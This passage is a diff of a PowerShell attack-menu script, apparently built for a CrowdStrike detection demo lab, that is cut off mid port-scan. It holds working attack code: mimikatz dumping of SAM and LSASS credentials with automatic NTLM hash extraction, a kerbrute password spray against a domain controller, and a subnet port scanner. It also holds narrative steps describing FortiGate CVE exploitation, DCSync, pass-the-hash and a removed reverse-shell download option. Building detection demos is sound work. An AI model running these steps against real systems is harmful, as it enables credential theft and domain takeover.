@@ -1,15 +1,23 @@
 # ============================================================
 #  Identity Attack Menu - Unmanaged Workstation
-#  Run as Administrator (demo account)
-#  Follows the phased scenario from portable_sender.py
-#  Version: 3.6 (2026-03-26)
+#  CrowdStrike NGSIEM + Identity Protection Demo
+#  Version: 4.0 (2026-03-26)
+#
+#  Attack narrative:
+#    1. Phishing campaign (narrative - logs from log generator)
+#    2. Fortinet exploitation (narrative - logs from log generator)
+#    3. Brute force DT from compromised Fortinet (active - kerbrute)
+#    4. Recon + credential dump + scan on DT (active - mimikatz)
+#    5. Attack Domain Controller - DCSync (active - PtH)
+#    6. Lateral movement to Ubuntu - cloud detections (active - SSH)
 # ============================================================
 
 # --- Environment Variables (set these in cmd BEFORE running) ---
 # set ENV_DOMAIN=<your-ad-domain>
 # set ENV_DC_IP=<DC IP address>
-# set ENV_BL=<BL IP address>
 # set ENV_DT=<DT IP address>
+# set ENV_FORTI_IP=<FortiGate firewall IP>
+# set ENV_UBUNTU=<Ubuntu server IP>
 
 $ErrorActionPreference = "Continue"
 $idpDir = "C:\IDP_Files"
@@ -28,26 +36,27 @@ if (Test-Path $ipConfigFile) {
 
 # --- Validate env vars on startup ---
 $missing = @()
-if (-not $env:ENV_DOMAIN)   { $missing += "ENV_DOMAIN" }
-if (-not $env:ENV_DC_IP)    { $missing += "ENV_DC_IP" }
-if (-not $env:ENV_BL)       { $missing += "ENV_BL" }
-if (-not $env:ENV_DT)       { $missing += "ENV_DT" }
+if (-not $env:ENV_DOMAIN)    { $missing += "ENV_DOMAIN" }
+if (-not $env:ENV_DC_IP)     { $missing += "ENV_DC_IP" }
+if (-not $env:ENV_DT)        { $missing += "ENV_DT" }
+if (-not $env:ENV_FORTI_IP)  { $missing += "ENV_FORTI_IP" }
+if (-not $env:ENV_UBUNTU)    { $missing += "ENV_UBUNTU" }
 if ($missing.Count -gt 0) {
     Write-Host "[!] Missing environment variables: $($missing -join ', ')" -ForegroundColor Red
     Write-Host "    Set them in cmd before running this script:" -ForegroundColor Yellow
     Write-Host '    set ENV_DOMAIN=lab.yourdomain.com' -ForegroundColor Gray
     Write-Host '    set ENV_DC_IP=<DC IP>' -ForegroundColor Gray
-    Write-Host '    set ENV_BL=<BL IP>' -ForegroundColor Gray
     Write-Host '    set ENV_DT=<DT IP>' -ForegroundColor Gray
+    Write-Host '    set ENV_FORTI_IP=<FortiGate IP>' -ForegroundColor Gray
+    Write-Host '    set ENV_UBUNTU=<Ubuntu IP>' -ForegroundColor Gray
     pause
     exit 1
 }
 
 # --- Validate IPs: hostnames won't work for PtH child processes ---
-# Saves overrides to ip_config.txt so you only enter them ONCE
 $ipPattern = '^\d+\.\d+\.\d+\.\d+$'
 $needSave = $false
-foreach ($varName in @("ENV_DC_IP", "ENV_BL", "ENV_DT")) {
+foreach ($varName in @("ENV_DC_IP", "ENV_DT", "ENV_FORTI_IP", "ENV_UBUNTU")) {
     $val = [Environment]::GetEnvironmentVariable($varName)
     if ($val -and $val -notmatch $ipPattern) {
         Write-Host "[!] $varName is set to hostname: $val (need IP address)" -ForegroundColor Red
@@ -62,9 +71,8 @@ foreach ($varName in @("ENV_DC_IP", "ENV_BL", "ENV_DT")) {
         }
     }
 }
-# Save all current IPs so next launch skips the prompts
 if ($needSave) {
-    @("ENV_DC_IP=$env:ENV_DC_IP", "ENV_BL=$env:ENV_BL", "ENV_DT=$env:ENV_DT", "ENV_DOMAIN=$env:ENV_DOMAIN") | Out-File -FilePath $ipConfigFile -Encoding ASCII
+    @("ENV_DC_IP=$env:ENV_DC_IP", "ENV_DT=$env:ENV_DT", "ENV_FORTI_IP=$env:ENV_FORTI_IP", "ENV_UBUNTU=$env:ENV_UBUNTU", "ENV_DOMAIN=$env:ENV_DOMAIN") | Out-File -FilePath $ipConfigFile -Encoding ASCII
     Write-Host "[+] IPs saved to $ipConfigFile (won't ask again)" -ForegroundColor Green
 }
 
@@ -77,7 +85,7 @@ function Get-ClarkHash {
     if (Test-Path $clarkHashFile) {
         return (Get-Content $clarkHashFile -First 1).Trim()
     }
-    Write-Host "[!] No clark.monroe hash found. Run Step 1 first." -ForegroundColor Red
+    Write-Host "[!] No clark.monroe hash found. Run Step 4 first." -ForegroundColor Red
     return $null
 }
 
@@ -85,7 +93,7 @@ function Get-DemoHash {
     if (Test-Path $demoHashFile) {
         return (Get-Content $demoHashFile -First 1).Trim()
     }
-    Write-Host "[!] No demo hash found. Run Step 1 first." -ForegroundColor Red
+    Write-Host "[!] No demo hash found. Run Step 4 first." -ForegroundColor Red
     return $null
 }
 
@@ -93,48 +101,68 @@ function Get-SvcRunbookHash {
     if (Test-Path $svcHashFile) {
         return (Get-Content $svcHashFile -First 1).Trim()
     }
-    Write-Host "[!] No svc_runbook hash found. Run Step 6 first." -ForegroundColor Red
+    Write-Host "[!] No svc_runbook hash found. Run Step 4 first." -ForegroundColor Red
     return $null
 }
 
-$scriptVersion = "3.6"
+# --- Helper: narrative banner ---
+function Show-StepBanner {
+    param(
+        [string]$Step,
+        [string]$Title,
+        [string[]]$Lines,
+        [string]$Detection = ""
+    )
+    Clear-Host
+    $width = 64
+    $border = "=" * $width
+    Write-Host ""
+    Write-Host "  $border" -ForegroundColor Cyan
+    Write-Host "  STEP $Step : $Title" -ForegroundColor Cyan
+    Write-Host "  $border" -ForegroundColor Cyan
+    Write-Host ""
+    foreach ($line in $Lines) {
+        Write-Host "  $line" -ForegroundColor White
+    }
+    if ($Detection) {
+        Write-Host ""
+        Write-Host "  NGSIEM / CrowdStrike detections:" -ForegroundColor Yellow
+        Write-Host "  $Detection" -ForegroundColor Yellow
+    }
+    Write-Host ""
+}
+
+$scriptVersion = "4.0"
 
 Write-Host "[+] IDP Attack Menu v$scriptVersion" -ForegroundColor Cyan
-Write-Host "[+] Config: DOMAIN=$env:ENV_DOMAIN  DC=$env:ENV_DC_IP  BL=$env:ENV_BL  DT=$env:ENV_DT" -ForegroundColor Green
+Write-Host "[+] Config: DOMAIN=$env:ENV_DOMAIN  DC=$env:ENV_DC_IP  DT=$env:ENV_DT" -ForegroundColor Green
+Write-Host "[+]         FORTI=$env:ENV_FORTI_IP  UBUNTU=$env:ENV_UBUNTU" -ForegroundColor Green
 if (Test-Path $clarkHashFile) {
     Write-Host "[+] clark.monroe NTLM: $(Get-Content $clarkHashFile -First 1)" -ForegroundColor Green
 } else {
-    Write-Host "[*] clark.monroe hash not yet extracted. Run Step 1." -ForegroundColor Yellow
+    Write-Host "[*] clark.monroe hash not yet extracted. Run Step 4." -ForegroundColor Yellow
 }
 Start-Sleep -Seconds 2
 
 function Show-Menu {
-    param ([string]$Title = 'Identity Attacks - Unmanaged Host')
+    param ([string]$Title = 'Identity Attack Demo - Unmanaged Host')
     Clear-Host
     Write-Host
     Write-Host "================ $Title ================" -ForegroundColor Cyan
     Write-Host
-    Write-Host "  Kill chain: dump hash -> PtH recon -> PtH to DT (EDR) -> dump svc_runbook -> PtH to BL (EDR)" -ForegroundColor DarkGray
-    Write-Host "  All steps use NTLM hashes (Pass-the-Hash) - no cleartext password needed" -ForegroundColor DarkGray
+    Write-Host "  Attack: phishing > firewall exploit > pivot to DT > dump creds > DC attack > cloud" -ForegroundColor DarkGray
     Write-Host
-    Write-Host "  --- Phase 2: Initial Access (after brute force to unmanaged) ---" -ForegroundColor Yellow
-    Write-Host "  1: System recon + credential dump                [whoami, sysinfo, dump NTLM]"
-    Write-Host "  2: Network discovery (ARP + port scan)           [Find DC, DT, BL on subnet]"
-    Write-Host "  3: LDAP recon via PtH (enumerate AD)             [Discover svc_runbook, groups]"
-    Write-Host "  4: Hash cracking + kerbrute spray                [Crack demo -> CredentialScanning]"
+    Write-Host "  --- Narrative (logs from log generator) ---" -ForegroundColor Yellow
+    Write-Host "  1: Phishing Campaign                       [Mimecast: spearphishing emails]"
+    Write-Host "  2: Fortinet Exploitation                   [FortiGate: CVE exploit + backdoor]"
     Write-Host
-    Write-Host "  --- Phase 4: Pivot to DT (Falcon EDR triggers) ---" -ForegroundColor Yellow
-    Write-Host "  5: PtH clark.monroe -> remote enum + dump on DT  [PassTheHash + LSASS + cred theft]"
-    Write-Host "  6: (Enter svc_runbook hash manually if needed)   [fallback for Step 5]"
+    Write-Host "  --- Active Attack Steps ---" -ForegroundColor Yellow
+    Write-Host "  3: Brute Force DT from Fortinet            [Kerbrute spray + IPS brute force]"
+    Write-Host "  4: Recon + Dump + Scan on DT               [mimikatz, network scan, LDAP, AD spray]"
+    Write-Host "  5: Attack DC (DCSync)                      [PtH clark.monroe -> DCSync all hashes]"
+    Write-Host "  6: Lateral to Ubuntu (Cloud Detections)    [SSH -> Log4Shell + S3 bucket scripts]"
     Write-Host
-    Write-Host "  --- Phase 5: Privilege Escalation + Lateral ---" -ForegroundColor Yellow
-    Write-Host "  7: Kerberoast svc_runbook (via PtH context)      [Kerberoasting detection]"
-    Write-Host "  8: PtH svc_runbook -> DCSync                     [PassTheHash + StaleAccount + DCSync]"
-    Write-Host "  9: PtH svc_runbook -> RDP to BL                  [EDR: lateral movement to BL]"
-    Write-Host
-    Write-Host "  --- Optional ---" -ForegroundColor DarkGray
-    Write-Host "  0: Download & execute reverse shell               [C2 callback]"
-    Write-Host
+    Write-Host "  C: Configure IPs" -ForegroundColor DarkGray
     Write-Host "  Q: Quit" -ForegroundColor Red
     Write-Host
 }
@@ -144,196 +172,320 @@ do {
     $selection = Read-Host "Select step"
     switch ($selection) {
 
+        # ================================================================
+        # STEP 1: PHISHING CAMPAIGN (Narrative)
+        # ================================================================
         '1' {
-            Clear-Host
-            Write-Host "[Step 1] System Recon + Credential Dump" -ForegroundColor Cyan
-            Write-Host "         Enumerating system info and dumping cached credentials..." -ForegroundColor Gray
+            Show-StepBanner -Step "1" -Title "INITIAL PHISHING CAMPAIGN" -Lines @(
+                "The attacker launches a spearphishing campaign targeting"
+                "multiple employees at the organization."
+                ""
+                "Attack emails include:"
+                "  - .xlsm macro-enabled spreadsheet (delivered)"
+                "  - .html credential harvester (delivered)"
+                "  - .zip archive with payload (blocked by Mimecast)"
+                "  - Phishing from spoofed external domains"
+                ""
+                "Some emails are BLOCKED by Mimecast (spam/AV filters)."
+                "Others are DELIVERED to user inboxes."
+                ""
+                ">> These logs are generated by the log generator"
+                ">> (portable_sender.py Mimecast samples)"
+            ) -Detection "Mimecast email receipt, delivery vs block events, suspicious attachments"
+
+            Write-Host "  What to look for in NGSIEM:" -ForegroundColor Cyan
+            Write-Host "  - Mimecast events: Rcpt, Process, Delivery" -ForegroundColor White
+            Write-Host "  - Blocked emails: SpamFilter, ContentExamination" -ForegroundColor White
+            Write-Host "  - Delivered emails with .xlsm, .html, .zip attachments" -ForegroundColor White
+            Write-Host "  - Sender reputation and domain analysis" -ForegroundColor White
             Write-Host
-
-            # --- Basic recon ---
-            Write-Host "--- Who am I? ---" -ForegroundColor Yellow
-            whoami /all
-            Write-Host
-
-            Write-Host "--- System Info ---" -ForegroundColor Yellow
-            Write-Host "  Hostname : $env:COMPUTERNAME" -ForegroundColor White
-            Write-Host "  OS       : $((Get-CimInstance Win32_OperatingSystem).Caption)" -ForegroundColor White
-            Write-Host "  Domain   : $((Get-CimInstance Win32_ComputerSystem).Domain)" -ForegroundColor White
-            Write-Host "  Joined   : $((Get-CimInstance Win32_ComputerSystem).PartOfDomain)" -ForegroundColor White
-            Write-Host
-
-            Write-Host "--- Network Config ---" -ForegroundColor Yellow
-            ipconfig /all | Select-String "IPv4|Subnet|Gateway|DNS Servers|DHCP Server"
-            Write-Host
-
-            Write-Host "--- Local Admins ---" -ForegroundColor Yellow
-            net localgroup Administrators
-            Write-Host
-
-            Write-Host "--- User profiles on this machine ---" -ForegroundColor Yellow
-            dir C:\Users | Select-Object Name | Format-Table -AutoSize
-
-            Write-Host "--- Local accounts ---" -ForegroundColor Yellow
-            net user
-
-            # --- Credential dump ---
-            Write-Host "--- Mimikatz Credential Dump ---" -ForegroundColor Yellow
-            & $mimiExe "privilege::debug" "token::elevate" "log $idpDir\step1_cred_dump.log" "lsadump::sam" "lsadump::cache" "sekurlsa::logonpasswords" "exit"
-
-            Write-Host "`n[+] Output saved to: $idpDir\step1_cred_dump.log" -ForegroundColor Green
-
-            # Auto-extract clark.monroe NTLM hash from dump
-            $dumpLog = "$idpDir\step1_cred_dump.log"
-            if (Test-Path $dumpLog) {
-                $logContent = Get-Content $dumpLog -Raw
-                # sekurlsa::logonpasswords pattern: User : clark.monroe ... NTLM : <hash>
-                if ($logContent -match "clark\.monroe[\s\S]*?NTLM\s*:\s*([0-9a-fA-F]{32})") {
-                    $extractedClark = $Matches[1].ToLower()
-                    $extractedClark | Out-File -FilePath $clarkHashFile -Encoding ASCII
-                    Write-Host "[+] clark.monroe NTLM extracted and saved: $extractedClark" -ForegroundColor Green
-                } else {
-                    Write-Host "[!] Could not auto-extract clark.monroe hash from dump." -ForegroundColor Yellow
-                    $manualHash = Read-Host "  Enter clark.monroe NTLM hash manually"
-                    if ($manualHash -and $manualHash.Length -eq 32) {
-                        $manualHash | Out-File -FilePath $clarkHashFile -Encoding ASCII
-                        Write-Host "[+] Hash saved." -ForegroundColor Green
-                    }
-                }
-
-                # Auto-extract demo account NTLM hash from SAM dump
-                # SAM dump pattern: User : demo ... Hash NTLM: <hash>
-                if ($logContent -match "User\s*:\s*demo[\s\S]*?Hash NTLM\s*:\s*([0-9a-fA-F]{32})") {
-                    $extractedDemo = $Matches[1].ToLower()
-                    $extractedDemo | Out-File -FilePath $demoHashFile -Encoding ASCII
-                    Write-Host "[+] demo NTLM extracted and saved: $extractedDemo" -ForegroundColor Green
-                } else {
-                    Write-Host "[!] Could not auto-extract demo hash from dump." -ForegroundColor Yellow
-                    $manualDemoHash = Read-Host "  Enter demo account NTLM hash manually"
-                    if ($manualDemoHash -and $manualDemoHash.Length -eq 32) {
-                        $manualDemoHash | Out-File -FilePath $demoHashFile -Encoding ASCII
-                        Write-Host "[+] Demo hash saved." -ForegroundColor Green
-                    }
-                }
-            }
-
-            Write-Host
-            Write-Host "[*] We have the NTLM hash - all next steps use Pass-the-Hash (no password needed)." -ForegroundColor Cyan
-            Write-Host "[*] Next: Step 2 (network discovery) to find targets on the subnet." -ForegroundColor Cyan
+            Write-Host "  [*] Next: Step 2 (Fortinet exploitation)" -ForegroundColor Cyan
         }
 
+        # ================================================================
+        # STEP 2: FORTINET EXPLOITATION (Narrative)
+        # ================================================================
         '2' {
-            Clear-Host
-            Write-Host "[Step 2] Network Discovery" -ForegroundColor Cyan
-            Write-Host "         Enumerating network config, discovering hosts, scanning ports..." -ForegroundColor Gray
-            Write-Host "         Generates traffic matching FortiGate port scan logs" -ForegroundColor Yellow
+            Show-StepBanner -Step "2" -Title "FORTINET EXPLOITATION" -Lines @(
+                "The attacker exploits known CVEs on the FortiGate"
+                "firewall at $($env:ENV_FORTI_IP) to gain super-admin access."
+                ""
+                "Exploit chain:"
+                "  1. CVE-2024-55591: jsconsole authentication bypass"
+                "  2. CVE-2023-27997: SSL-VPN heap overflow (sslvpnd crash)"
+                "  3. Create backdoor admin account: svc_backup"
+                "  4. Add svc_backup to super_admin profile"
+                "  5. Modify SSLVPN settings for persistent access"
+                "  6. Disable event logging to cover tracks"
+                "  7. Delete svc_backup (short-lived, forensic evasion)"
+                "  8. Establish VPN tunnel into internal network"
+                ""
+                ">> These logs are generated by the log generator"
+                ">> (portable_sender.py FortiGate samples)"
+            ) -Detection "FortiGate: jsconsole anomaly, admin creation/deletion, config changes, VPN tunnel"
+
+            Write-Host "  What to look for in NGSIEM:" -ForegroundColor Cyan
+            Write-Host "  - FortiGate system events: admin login from unexpected IPs" -ForegroundColor White
+            Write-Host "  - Rapid admin account creation then deletion (svc_backup)" -ForegroundColor White
+            Write-Host "  - SSLVPN configuration changes" -ForegroundColor White
+            Write-Host "  - Event logging disabled (gap in logs)" -ForegroundColor White
+            Write-Host "  - VPN tunnel established from external IP" -ForegroundColor White
             Write-Host
-
-            # --- Phase 1: Network config ---
-            Write-Host "--- Network Configuration ---" -ForegroundColor Yellow
-            $adapter = Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway }
-            $myIP = $adapter.IPv4Address.IPAddress
-            $gateway = $adapter.IPv4DefaultGateway.NextHop
-            $dnsServers = (Get-DnsClientServerAddress -InterfaceIndex $adapter.InterfaceIndex -AddressFamily IPv4).ServerAddresses
-
-            Write-Host "  Local IP : $myIP" -ForegroundColor White
-            Write-Host "  Gateway  : $gateway" -ForegroundColor White
-            Write-Host "  DNS      : $($dnsServers -join ', ')" -ForegroundColor White
-            Write-Host
-            Write-Host "  [*] DNS server is likely the Domain Controller" -ForegroundColor Cyan
-            Write-Host
-
-            # --- Phase 2: ARP table + discover hosts ---
-            Write-Host "--- ARP Table (known neighbors) ---" -ForegroundColor Yellow
-            arp -a
-            Write-Host
-
-            # Collect IPs to scan: ARP entries (non-broadcast, non-multicast) + DNS servers
-            $arpEntries = arp -a | Select-String '(\d+\.\d+\.\d+\.\d+)' | ForEach-Object {
-                $ip = $_.Matches[0].Value
-                if ($ip -notmatch '^(224\.|239\.|255\.|169\.254)' -and $ip -ne $myIP -and $ip -ne "255.255.255.255") {
-                    $ip
-                }
-            } | Sort-Object -Unique
-
-            # Add DNS servers (likely DC on different subnet)
-            $allTargets = @($arpEntries) + @($dnsServers) | Sort-Object -Unique
-            Write-Host "--- Discovered hosts to scan ---" -ForegroundColor Yellow
-            $allTargets | ForEach-Object { Write-Host "  $_" -ForegroundColor White }
-            Write-Host
-
-            # --- Phase 3: Port scan each host ---
-            $scanPorts = @(88, 389, 636, 445, 3389, 135, 5985, 22, 53)
-            $discovered = @()
-
-            Write-Host "--- Port scan (TCP) ---" -ForegroundColor Yellow
-            foreach ($ip in $allTargets) {
-                Write-Host "`n  Scanning $ip ..." -ForegroundColor White
-                $openPorts = @()
-
-                foreach ($port in $scanPorts) {
-                    $tcp = New-Object System.Net.Sockets.TcpClient
-                    try {
-                        $tcp.ConnectAsync($ip, $port).Wait(1000) | Out-Null
-                        if ($tcp.Connected) {
-                            Write-Host "    Port $port : OPEN" -ForegroundColor Green
-                            $openPorts += $port
-                        }
-                    } catch { }
-                    $tcp.Close()
-                }
-
-                if ($openPorts.Count -eq 0) {
-                    Write-Host "    No open ports found" -ForegroundColor DarkGray
-                }
-
-                # Auto-identify role based on open ports
-                $role = ""
-                if ($openPorts -contains 88 -and $openPorts -contains 389) {
-                    $role = "DOMAIN CONTROLLER"
-                } elseif ($openPorts -contains 3389 -and $openPorts -contains 445) {
-                    $role = "WORKSTATION/SERVER"
-                } elseif ($ip -eq $gateway) {
-                    $role = "GATEWAY"
-                }
-
-                if ($role) {
-                    Write-Host "    >> Identified: $role" -ForegroundColor Cyan
-                }
-
-                $discovered += [PSCustomObject]@{
-                    IP = $ip
-                    Role = $role
-                    Ports = ($openPorts -join ',')
-                }
-            }
-
-            # --- Summary ---
-            Write-Host "`n--- Discovery Summary ---" -ForegroundColor Yellow
-            foreach ($h in $discovered) {
-                $label = if ($h.Role) { " [$($h.Role)]" } else { "" }
-                $ports = if ($h.Ports) { " Ports: $($h.Ports)" } else { " (no open ports)" }
-                Write-Host "  $($h.IP)${label}${ports}" -ForegroundColor $(if ($h.Role -eq "DOMAIN CONTROLLER") { "Red" } elseif ($h.Role) { "Yellow" } else { "Gray" })
-            }
-
-            # Save DC IP for other steps
-            $dcHost = $discovered | Where-Object { $_.Role -eq "DOMAIN CONTROLLER" } | Select-Object -First 1
-            if ($dcHost) {
-                Write-Host "`n[+] Domain Controller found: $($dcHost.IP)" -ForegroundColor Green
-                $dcHost.IP | Out-File -FilePath "$idpDir\discovered_dc.txt" -Encoding ASCII
-            }
-
-            Write-Host "[*] Next: Step 3 (LDAP recon via PtH) to enumerate AD." -ForegroundColor Cyan
+            Write-Host "  [*] The attacker now has a VPN tunnel into the internal network." -ForegroundColor Yellow
+            Write-Host "  [*] Next: Step 3 (brute force DT from compromised Fortinet)" -ForegroundColor Cyan
         }
 
+        # ================================================================
+        # STEP 3: BRUTE FORCE DT FROM COMPROMISED FORTINET (Active)
+        # ================================================================
         '3' {
-            Clear-Host
-            Write-Host "[Step 3] LDAP Reconnaissance via Pass-the-Hash" -ForegroundColor Cyan
-            Write-Host "         PtH clark.monroe -> spawn PowerShell -> LDAP queries" -ForegroundColor Gray
-            Write-Host "         Generates LDAP traffic matching FortiGate sample [108]" -ForegroundColor Yellow
+            Show-StepBanner -Step "3" -Title "BRUTE FORCE DT FROM COMPROMISED FORTINET" -Lines @(
+                "The compromised FortiGate ($($env:ENV_FORTI_IP)) is used as a pivot."
+                "The attacker targets the DT machine at $($env:ENV_DT)."
+                ""
+                "Attack: Password spray against AD using credentials"
+                "harvested from the FortiGate config + common passwords."
+                ""
+                "DT has CrowdStrike Falcon (detect mode) - alerts will fire."
+                ""
+                "FortiGate IPS brute force logs come from the log generator."
+                "This step runs kerbrute to trigger CrowdStrike IDP detection."
+            ) -Detection "FortiGate IPS: brute force signature | CrowdStrike IDP: CredentialScanningActiveDirectory"
+
+            # --- Kerbrute password spray ---
+            Write-Host "--- Kerbrute Password Spray ---" -ForegroundColor Yellow
             Write-Host
 
-            # Create LDAP recon script that runs in PtH context
-            $ldapScript = @'
+            $userFile = "$idpDir\ldap_users.txt"
+            if (-not (Test-Path $userFile)) {
+                $userFile = "$idpDir\users.txt"
+                Write-Host "  Using static user list ($userFile)" -ForegroundColor Yellow
+            } else {
+                Write-Host "  Using LDAP-harvested user list" -ForegroundColor Green
+            }
+            Write-Host "  DC: $env:ENV_DC_IP  Domain: $env:ENV_DOMAIN" -ForegroundColor Gray
+            Write-Host
+
+            $sprayPw = Read-Host "  Enter password to spray (e.g. Password1)"
+            if ($sprayPw) {
+                Write-Host
+                Write-Host "  [*] Spraying '$sprayPw' against all users via Kerberos pre-auth..." -ForegroundColor White
+                Write-Host "  [*] This triggers CredentialScanningActiveDirectory in CrowdStrike IDP" -ForegroundColor Yellow
+                Write-Host
+
+                $kerbrute = "$idpDir\kerbrute.exe"
+                if (-not (Test-Path $kerbrute)) {
+                    $kerbrute = "$idpDir\kerbrute_windows_amd64.exe"
+                }
+
+                if (Test-Path $kerbrute) {
+                    try {
+                        $proc = Start-Process -FilePath $kerbrute `
+                            -ArgumentList "passwordspray --dc $env:ENV_DC_IP -d $env:ENV_DOMAIN `"$userFile`" $sprayPw" `
+                            -NoNewWindow -Wait -PassThru
+                        Write-Host "`n  [+] Kerbrute finished (exit code: $($proc.ExitCode))." -ForegroundColor Green
+                    } catch {
+                        Write-Host "  [!] Kerbrute error: $_" -ForegroundColor Red
+                    }
+                } else {
+                    Write-Host "  [!] kerbrute not found at $idpDir" -ForegroundColor Red
+                    Write-Host "  [*] Download kerbrute to $idpDir\kerbrute.exe" -ForegroundColor Gray
+                }
+            } else {
+                Write-Host "  [*] Skipped spray." -ForegroundColor Yellow
+            }
+
+            Write-Host
+            Write-Host "  [*] Next: Step 4 (Recon + Dump on DT)" -ForegroundColor Cyan
+        }
+
+        # ================================================================
+        # STEP 4: RECON + DUMP + SCAN ON DT (Active - Sub-menu)
+        # ================================================================
+        '4' {
+            $step4Done = $false
+            do {
+                Clear-Host
+                Write-Host
+                Write-Host "  ================================================================" -ForegroundColor Cyan
+                Write-Host "  STEP 4 : RECON + CREDENTIAL DUMP + SCAN ON DT" -ForegroundColor Cyan
+                Write-Host "  ================================================================" -ForegroundColor Cyan
+                Write-Host
+                Write-Host "  Now on DT, the attacker performs recon and credential theft." -ForegroundColor White
+                Write-Host "  DT has CrowdStrike Falcon in DETECT mode." -ForegroundColor Yellow
+                Write-Host
+                Write-Host "  A: Run ALL (4a > 4b > 4c > 4d)" -ForegroundColor Green
+                Write-Host "  1: System recon (whoami, ipconfig, net user)"
+                Write-Host "  2: Mimikatz credential dump (SAM + logonpasswords)"
+                Write-Host "  3: Network scan (ARP + port scan)"
+                Write-Host "  4: LDAP recon via PtH (enumerate AD users, SPNs)"
+                Write-Host "  B: Back to main menu"
+                Write-Host
+                $sub = Read-Host "  Select"
+
+                if ($sub -eq 'B' -or $sub -eq 'b') { $step4Done = $true; continue }
+
+                # --- 4a: System Recon ---
+                if ($sub -eq '1' -or $sub -eq 'A' -or $sub -eq 'a') {
+                    Write-Host "`n--- 4a: System Reconnaissance ---" -ForegroundColor Yellow
+                    Write-Host
+
+                    Write-Host "--- Who am I? ---" -ForegroundColor Yellow
+                    whoami /all
+                    Write-Host
+
+                    Write-Host "--- System Info ---" -ForegroundColor Yellow
+                    Write-Host "  Hostname : $env:COMPUTERNAME" -ForegroundColor White
+                    Write-Host "  OS       : $((Get-CimInstance Win32_OperatingSystem).Caption)" -ForegroundColor White
+                    Write-Host "  Domain   : $((Get-CimInstance Win32_ComputerSystem).Domain)" -ForegroundColor White
+                    Write-Host "  Joined   : $((Get-CimInstance Win32_ComputerSystem).PartOfDomain)" -ForegroundColor White
+                    Write-Host
+
+                    Write-Host "--- Network Config ---" -ForegroundColor Yellow
+                    ipconfig /all | Select-String "IPv4|Subnet|Gateway|DNS Servers|DHCP Server"
+                    Write-Host
+
+                    Write-Host "--- Local Admins ---" -ForegroundColor Yellow
+                    net localgroup Administrators
+                    Write-Host
+
+                    Write-Host "--- User profiles ---" -ForegroundColor Yellow
+                    dir C:\Users | Select-Object Name | Format-Table -AutoSize
+
+                    Write-Host "--- Local accounts ---" -ForegroundColor Yellow
+                    net user
+
+                    if ($sub -ne 'A' -and $sub -ne 'a') { pause; continue }
+                }
+
+                # --- 4b: Mimikatz Credential Dump ---
+                if ($sub -eq '2' -or $sub -eq 'A' -or $sub -eq 'a') {
+                    Write-Host "`n--- 4b: Mimikatz Credential Dump ---" -ForegroundColor Yellow
+                    Write-Host "  Triggers: LSASS access, credential dumping on Falcon-managed host" -ForegroundColor Yellow
+                    Write-Host
+
+                    & $mimiExe "privilege::debug" "token::elevate" "log $idpDir\step4_cred_dump.log" "lsadump::sam" "lsadump::cache" "sekurlsa::logonpasswords" "exit"
+
+                    Write-Host "`n[+] Output saved to: $idpDir\step4_cred_dump.log" -ForegroundColor Green
+
+                    # Auto-extract clark.monroe NTLM hash
+                    $dumpLog = "$idpDir\step4_cred_dump.log"
+                    if (Test-Path $dumpLog) {
+                        $logContent = Get-Content $dumpLog -Raw
+
+                        if ($logContent -match "clark\.monroe[\s\S]*?NTLM\s*:\s*([0-9a-fA-F]{32})") {
+                            $extractedClark = $Matches[1].ToLower()
+                            $extractedClark | Out-File -FilePath $clarkHashFile -Encoding ASCII
+                            Write-Host "[+] clark.monroe NTLM extracted: $extractedClark" -ForegroundColor Green
+                        } else {
+                            Write-Host "[!] Could not auto-extract clark.monroe hash." -ForegroundColor Yellow
+                            $manualHash = Read-Host "  Enter clark.monroe NTLM hash manually"
+                            if ($manualHash -and $manualHash.Length -eq 32) {
+                                $manualHash | Out-File -FilePath $clarkHashFile -Encoding ASCII
+                                Write-Host "[+] Hash saved." -ForegroundColor Green
+                            }
+                        }
+
+                        # Auto-extract demo account NTLM hash
+                        if ($logContent -match "User\s*:\s*demo[\s\S]*?Hash NTLM\s*:\s*([0-9a-fA-F]{32})") {
+                            $extractedDemo = $Matches[1].ToLower()
+                            $extractedDemo | Out-File -FilePath $demoHashFile -Encoding ASCII
+                            Write-Host "[+] demo NTLM extracted: $extractedDemo" -ForegroundColor Green
+                        } else {
+                            Write-Host "[!] Could not auto-extract demo hash." -ForegroundColor Yellow
+                            $manualDemoHash = Read-Host "  Enter demo NTLM hash manually"
+                            if ($manualDemoHash -and $manualDemoHash.Length -eq 32) {
+                                $manualDemoHash | Out-File -FilePath $demoHashFile -Encoding ASCII
+                                Write-Host "[+] Demo hash saved." -ForegroundColor Green
+                            }
+                        }
+                    }
+
+                    Write-Host "[*] Hashes ready for Steps 5 and 6." -ForegroundColor Cyan
+                    if ($sub -ne 'A' -and $sub -ne 'a') { pause; continue }
+                }
+
+                # --- 4c: Network Scan ---
+                if ($sub -eq '3' -or $sub -eq 'A' -or $sub -eq 'a') {
+                    Write-Host "`n--- 4c: Network Discovery ---" -ForegroundColor Yellow
+                    Write-Host
+
+                    $adapter = Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway }
+                    $myIP = $adapter.IPv4Address.IPAddress
+                    $gateway = $adapter.IPv4DefaultGateway.NextHop
+                    $dnsServers = (Get-DnsClientServerAddress -InterfaceIndex $adapter.InterfaceIndex -AddressFamily IPv4).ServerAddresses
+
+                    Write-Host "  Local IP : $myIP" -ForegroundColor White
+                    Write-Host "  Gateway  : $gateway" -ForegroundColor White
+                    Write-Host "  DNS      : $($dnsServers -join ', ')" -ForegroundColor White
+                    Write-Host
+
+                    Write-Host "--- ARP Table ---" -ForegroundColor Yellow
+                    arp -a
+                    Write-Host
+
+                    $arpEntries = arp -a | Select-String '(\d+\.\d+\.\d+\.\d+)' | ForEach-Object {
+                        $ip = $_.Matches[0].Value
+                        if ($ip -notmatch '^(224\.|239\.|255\.|169\.254)' -and $ip -ne $myIP -and $ip -ne "255.255.255.255") { $ip }
+                    } | Sort-Object -Unique
+
+                    $allTargets = @($arpEntries) + @($dnsServers) | Sort-Object -Unique
+                    Write-Host "--- Discovered hosts ---" -ForegroundColor Yellow
+                    $allTargets | ForEach-Object { Write-Host "  $_" -ForegroundColor White }
+                    Write-Host
+
+                    $scanPorts = @(88, 389, 636, 445, 3389, 135, 5985, 22, 53)
+                    $discovered = @()
+
+                    Write-Host "--- Port Scan (TCP) ---" -ForegroundColor Yellow
+                    foreach ($ip in $allTargets) {
+                        Write-Host "`n  Scanning $ip ..." -ForegroundColor White
+                        $openPorts = @()
+                        foreach ($port in $scanPorts) {
+                            $tcp = New-Object System.Net.Sockets.TcpClient
+                            try {
